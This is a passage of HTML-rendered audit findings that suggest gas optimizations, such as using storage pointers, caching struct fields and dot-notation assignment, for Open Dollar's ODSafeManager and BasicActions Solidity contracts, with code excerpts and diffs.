class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lockedCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deltaDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">generatedDebt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toInt</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ISAFEEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">safeEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferSAFECollateralAndDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_dstData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaCollateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Remove safe from owner&#39;s list (notice it doesn&#39;t erase safe ownership)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeSrc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_srcData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeSrc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MoveSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeSrc</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeDst</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function moveSAFE(uint256 _safeSrc, uint256 _safeDst) external safeAllowed(_safeSrc) safeAllowed(_safeDst) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _srcData = _safeData[_safeSrc];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _dstData = _safeData[_safeDst];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (_srcData.collateralType != _dstData.collateralType) revert CollateralTypesMismatch();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_srcData.collateralType, _srcData.safeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _srcData = _safeData[_safeSrc];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _dstData = _safeData[_safeDst];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bytes32 _srcDataCollateralType= _srcData.collateralType;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (_srcDataCollateralType != _dstData.collateralType) revert CollateralTypesMismatch();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _srcDataOwner = _srcData.owner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _srcDataSafeHandler = _srcData.safeHandler;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ISAFEEngine.SAFE memory _safeInfo = ISAFEEngine(safeEngine).safes(_srcDataCollateralType, _srcDataSafeHandler);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaCollateral = _safeInfo.lockedCollateral.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     int256 _deltaDebt = _safeInfo.generatedDebt.toInt();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ISAFEEngine(safeEngine).transferSAFECollateralAndDebt(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      _srcData.collateralType, _srcData.safeHandler, _dstData.safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      _srcDataCollateralType, _srcDataSafeHandler, _dstData.safeHandler, _deltaCollateral, _deltaDebt</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     // Remove safe from owner&#39;s list (notice it doesn&#39;t erase safe ownership)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafes[_srcData.owner].remove(_safeSrc);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafesPerCollat[_srcData.owner][_srcData.collateralType].remove(_safeSrc);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafes[_srcDataOwner].remove(_safeSrc);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafesPerCollat[_srcDataOwner][_srcDataCollateralType].remove(_safeSrc);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit MoveSAFE(msg.sender, _safeSrc, _safeDst);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"odsafemanagersolremovesafe-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" style=\"position:relative;\"><a href=\"#odsafemanagersolremovesafe-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" aria-label=\"odsafemanagersolremovesafe use storage for _sdata and cache repeatedly read fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.removeSAFE(): Use storage for <code>_sData</code> and cache repeatedly read fields</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L242-L246\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L242-L246</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">242</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">removeSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">243</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_usrSafesPerCollat</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">].</span><span class=\"mtk11\">remove</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function removeSAFE(uint256 _safe) external safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafes[_sData.owner].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _usrSafesPerCollat[_sData.owner][_sData.collateralType].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _owner = _sData.owner;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafes[_owner].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _usrSafesPerCollat[_owner][_sData.collateralType].remove(_safe);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"odsafemanagersolprotectsafe-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" style=\"position:relative;\"><a href=\"#odsafemanagersolprotectsafe-use-storage-for-_sdata-and-cache-repeatedly-read-fields\" aria-label=\"odsafemanagersolprotectsafe use storage for _sdata and cache repeatedly read fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ODSafeManager.sol.protectSAFE(): Use storage for <code>_sData</code> and cache repeatedly read fields</h3>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L249-L253\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L249-L253</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">protectSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_liquidationEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_saviour</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeAllowed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">250</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">SAFEData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">251</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ILiquidationEngine</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_liquidationEngine</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protectSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_sData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saviour</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProtectSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safe</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_liquidationEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_saviour</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">253</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function protectSAFE(uint256 _safe, address _liquidationEngine, address _saviour) external safeAllowed(_safe) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    SAFEData memory _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _sData = _safeData[_safe];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ILiquidationEngine(_liquidationEngine).protectSAFE(_sData.collateralType, _sData.safeHandler, _saviour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit ProtectSAFE(msg.sender, _safe, _liquidationEngine, _saviour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"g-07-leverage-mapping-and-dot-notation-for-struct-assignment\" style=\"position:relative;\"><a href=\"#g-07-leverage-mapping-and-dot-notation-for-struct-assignment\" aria-label=\"g 07 leverage mapping and dot notation for struct assignment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] Leverage mapping and dot notation for struct assignment</h2>\n<p>In dot notation, values are directly written to storage variable, When we use the current method in the code the compiler will allocate some memory to store the struct instance first before writing it to storage.</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L118-L124\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L118-L124</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ODSafeManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">openSAFE</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">_safeData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">SAFEData</span><span class=\"mtk1\">({</span><span class=\"mtk12\">owner:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">safeHandler:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeHandler</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralType:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cType</span><span class=\"mtk1\">});</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/contracts/proxies/ODSafeManager.sol b/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b3ab2f5..ed1a730 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/contracts/proxies/ODSafeManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -120,8 +120,11 @@ contract ODSafeManager is IODSafeManager {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ++_safeId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address _safeHandler = address(new SAFEHandler(safeEngine));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    SAFEData storage _SAFEData = _safeData[_safeId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    _safeData[_safeId] = SAFEData({owner: _usr, safeHandler: _safeHandler, collateralType: _cType});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _SAFEData.owner = _usr;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _SAFEData.safeHandler = _safeHandler;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    _SAFEData.collateralType = _cType;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _usrSafes[_usr].add(_safeId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _usrSafesPerCollat[_usr][_cType].add(_safeId);</span></span></span></code></pre>\n<h2 id=\"g-08-dont-cache-if-used-only-once\" style=\"position:relative;\"><a href=\"#g-08-dont-cache-if-used-only-once\" aria-label=\"g 08 dont cache if used only once permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Don’t cache if used only once</h2>\n<p>Caching here will simply increase gas cost, since it doesn’t affect readability, we should not cache since we only reference the cached variables only once.</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L101-L111\">https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/actions/BasicActions.sol#L101-L111</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ODSafeManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeEngine</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:    </span><span class=\"mtk3\">// Generates debt in the SAFE</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">_modifySAFECollateralization</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_manager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">_safeId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">_getGeneratedDeltaDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_safeEngine</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_safeInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralType</span><span class=\"mtk1\">, 